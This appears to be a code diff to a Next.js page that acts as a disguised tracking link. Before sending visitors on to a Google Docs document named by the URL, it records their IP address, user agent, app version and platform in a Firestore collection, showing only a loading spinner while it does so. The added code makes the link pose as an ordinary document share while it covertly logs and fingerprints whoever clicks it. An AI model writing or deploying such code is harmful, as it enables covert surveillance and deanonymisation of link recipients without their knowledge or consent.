@@ -4,11 +4,18 @@ import { redirect } from 'next/navigation'
 import { useEffect, useState } from 'react';
 import {db} from '@/config/firebaConfig'
 import {collection, addDoc, Timestamp } from 'firebase/firestore'
+import { useSearchParams } from 'next/navigation';
+
 function Test({params}) {
+
 
   const ipCollectionRef = collection(db,"ips");
 
+  const searchParams = useSearchParams();
+
   const [ip, setIp] = useState();
+
+  const page = searchParams.get('usp');
 
     useEffect(()=>{
       
@@ -32,27 +39,40 @@ function Test({params}) {
 
           //   }
           // );
+          // User Agent
+          const userAgent = navigator.userAgent;
+
+          // Browser Information
+          const appName = navigator.appName;
+          const appVersion = navigator.appVersion;
+          const platform = navigator.platform; 
 
           await addDoc(ipCollectionRef,{ip:data.ip, 
-            createAt: Timestamp.fromDate(new Date())})
-            .then(()=>{
-              switch (params.id) {
-                case '1Rt0NlC-G361vHwViwqcAXtJqPYsWnL5dLF2r3gjXSA4v':
-                  window.location.href = 'https://example.com';
-                  // redirect('https://example.com');
-                  break;
-                case 'google':
-                  window.location.href = 'https://google.com';
-                  // redirect('https://google.com');
-                  break;
-                default:
-                  console.log(params.id);
-                  break;
-              }
+            createAt: Timestamp.fromDate(new Date()),
+            userAgent,
+            appName,
+            appVersion,
+            platform
+            
             })
 
-          
 
+            .then(()=>{
+              window.location.href = `https://docs.google.com/document/d/${params.id}/edit?usp=sharing`;
+              // switch (params.id) {
+              //   case '1Rt0NlC-G361vHwViwqcAXtJqPYsWnL5dLF2r3gjXSA4v':
+              //     window.location.href = 'https://example.com';
+              //     // redirect('https://example.com');
+              //     break;
+              //   case 'google':
+              //     window.location.href = 'https://google.com';
+              //     // redirect('https://google.com');
+              //     break;
+              //   default:
+              //     console.log(params.id);
+              //     break;
+              // }
+            })
         })
 
       }
@@ -67,7 +87,10 @@ function Test({params}) {
         <div>
         {ip}
         </div> */}
-        <div class="rounded-full h-20 w-20 bg-blue-400 animate-ping"></div>
+
+        {/* {page} */}
+
+        <div className="rounded-full h-20 w-20 bg-blue-400 animate-ping"></div>
     </div>
    
   )
